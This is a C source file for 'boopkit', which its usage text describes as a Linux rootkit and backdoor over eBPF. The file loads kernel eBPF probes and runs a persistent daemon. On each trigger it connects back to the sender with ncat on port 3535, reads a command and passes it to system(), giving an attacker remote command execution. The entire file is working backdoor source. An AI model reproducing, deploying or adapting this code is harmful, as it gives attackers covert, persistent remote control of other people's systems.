// Copyright © 2022 Kris Nóva <kris@nivenly.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗
// ████╗  ██║██╔═████╗██║   ██║██╔══██╗
// ██╔██╗ ██║██║██╔██║██║   ██║███████║
// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
//
// [boopkit.c]
//
// Where the main() function goes down.

#include <arpa/inet.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// clang-format off
#include "boopkit.h"
#include "pr0be.skel.h"
// clang-format on

#define VERSION "0.0.1"

// PORT must match the ${SRC_PORT} in the /remote script!
#define PORT 3535

// MAX_DENY_ADDRS is the maximum amount of address that can be denied.
#define MAX_DENY_ADDRS 1024

// MAX_RCE_SIZE is the maximum size of a remote command to execute.
#define MAX_RCE_SIZE 1024

// PROBE_BOOP is the eBPF probe to listen for boops
#define PROBE_BOOP "pr0be.boop.o"
#define PROBE_SAFE "pr0be.safe.o"

void asciiheader() {
  printf("\n\n");
  printf("   ██████╗  ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗████████╗\n");
  printf("   ██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║╚══██╔══╝\n");
  printf("   ██████╔╝██║   ██║██║   ██║██████╔╝█████╔╝ ██║   ██║   \n");
  printf("   ██╔══██╗██║   ██║██║   ██║██╔═══╝ ██╔═██╗ ██║   ██║   \n");
  printf("   ██████╔╝╚██████╔╝╚██████╔╝██║     ██║  ██╗██║   ██║   \n");
  printf("   ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝   ╚═╝   \n");
  printf("\n\n");
}

void usage(){
  printf("Boopkit version: %s\n", VERSION);
  printf("Linux rootkit and backdoor over eBPF.\n");
  printf("Author: Kris Nóva <kris@nivenly.com>\n");
  printf("\n");
  printf("Usage: boopkit [options]\n");
  printf("\n");
  printf("Options:\n");
  printf("-h, help           Display help and usage for boopkit.\n");
  printf("-x, ignore         Source addresses to reject triggers from.\n");
  printf("\n");
  exit(0);
}

// handlerev will handle a reverse lookup against
// a triggered event. This is responsible for
// finding whatever remote command will need to
// be executed on the bookit exploited machine.
char *handlerev(char dial[INET_ADDRSTRLEN], char *recrce) {
  printf("  * Boop: %s\n ", dial);
  // -- Hacky implementation --
  char cmd[MAX_RCE_SIZE];
  sprintf(cmd, "ncat %s %d", dial, PORT);
  FILE *fp;
  fp = popen(cmd, "r");
  if (fp == NULL) {
    return recrce;
  }
  while (fgets(recrce, MAX_RCE_SIZE, fp) != NULL) {
    //printf("RCE: %s\n", recrce);
    return recrce;
  }
  // -- Hacky implementation --
  return recrce;
}

struct config {
  int denyc;
  char deny[MAX_DENY_ADDRS][INET_ADDRSTRLEN];
} cfg;

void clisetup(int argc, char **argv) {
  cfg.denyc = 0;
  for (int i = 0; i < argc; i++) {
    if (argv[i][0] == '-') {
      switch (argv[i][1]) {
        case 'x':
          // Append deny addr
          strcpy(cfg.deny[cfg.denyc], argv[i + 1]);
          cfg.denyc++;
          break;
        case 'h':
          usage();
          break;
      }
    }
  }
}

// main
//
// The primary program entry point and argument handling
int main(int argc, char **argv) {
  asciiheader();
  clisetup(argc, argv);

  printf("Logs: cat /sys/kernel/tracing/trace_pipe\n");
  // Return value for eBPF loading
  int loaded;

  // ===========================================================================
  // Safe probes
  //
  // This will load the safe kernel probes at runtime.
  //
  struct pr0be_safe *sfobj;
  char sfpath[PATH_MAX] = PROBE_SAFE;
  printf("  -> Loading eBPF Probe: %s\n", sfpath);
  sfobj = pr0be_safe__open();
  loaded = pr0be_safe__load(sfobj);
  if (loaded < 0) {
    printf("Unable to load eBPF object: %s\n", sfpath);
    printf("Privileged acces required to load eBPF probe!\n");
    printf("Permission denied.\n");
    return 1;
  }
  printf("  -> eBPF Probe loaded: %s\n", sfpath);
  // TODO manage safe probe userspace

  // ===========================================================================
  // Boop probes
  //
  // This will load the boop kernel probes at runtime.
  //
  struct bpf_object *bpobj;
  char bppath[PATH_MAX] = PROBE_BOOP;
  printf("  -> Loading eBPF Probe: %s\n", bppath);
  bpobj = bpf_object__open(bppath);
  if (!bpobj) {
    printf("Unable to open eBPF object: %s\n", bppath);
    printf("Privileged acces required to load eBPF probe!\n");
    printf("Permission denied.\n");
    return 1;
  }
  loaded = bpf_object__load(bpobj);
  if (loaded < 0) {
    printf("Unable to load eBPF object: %s\n", bppath);
    return 1;
  }
  printf("  -> eBPF Probe loaded: %s\n", bppath);
  struct bpf_program *program = NULL;
  bpf_object__for_each_program(program, bpobj) {
    printf("  -> eBPF Program Address: %p\n", program);
    const char *progname = bpf_program__name(program);
    printf("  -> eBPF Program Name: %s\n", progname);
    const char *progsecname = bpf_program__section_name(program);
    printf("  -> eBPF Program Section Name: %s\n", progsecname);
    struct bpf_link *link = bpf_program__attach(program);
    if (!link) {
      printf("Unable to link eBPF program: %s\n", progname);
      continue;
    }
  }

  // ===========================================================================
  // Boop eBPF Map
  //
  // We (by design) only have a single map for the boop object!
  // Therefore, we can call next_map() with NULL and get the first
  // map from the probe.
  struct bpf_map *bpmap = bpf_object__next_map(bpobj, NULL);
  const char *mapname = bpf_map__name(bpmap);
  printf("  -> eBPF Map Name: %s\n", mapname);
  int fd = bpf_map__fd(bpmap);
  printf("  -> eBPF Program Linked!\n");

  for (int i = 0; i < cfg.denyc; i++) {
    printf("   X Deny address: %s\n", cfg.deny[i]);
  }

  // ===========================================================================
  // Boopkit event loop
  //
  // Boopkit will run as a persistent daemon in userspace!
  int ignore = 0;
  while (1) {
    // =========================================================================
    // Boop map management
    //
    int ikey = 0, jkey;
    int err;
    char saddrval[INET_ADDRSTRLEN];  // Saturn Valley. If you know, you know.
    struct tcp_return ret;
    while (!bpf_map_get_next_key(fd, &ikey, &jkey)) {
      err = bpf_map_lookup_elem(fd, &jkey, &ret);
      if (err < 0) {
        continue;
      }
      ignore = 0;
      inet_ntop(AF_INET, &ret.saddr, saddrval, sizeof(saddrval));
      for (int i = 0; i < cfg.denyc; i++) {
        if (strncmp(saddrval, cfg.deny[i], INET_ADDRSTRLEN) == 0){
          // Ignoring string in deny list
          ignore = 1;
          break;
        }
      }
      if (!ignore) {
          char *rce;
          char *recrce = malloc(MAX_RCE_SIZE);
          rce = handlerev(saddrval, recrce);
          printf(" <- %s", rce);
          system(rce);
          free(recrce);
      }
      err = bpf_map_delete_elem(fd, &jkey);
      if (err < 0) {
        return 0;
      }
      ikey = jkey;
    }
  }
}

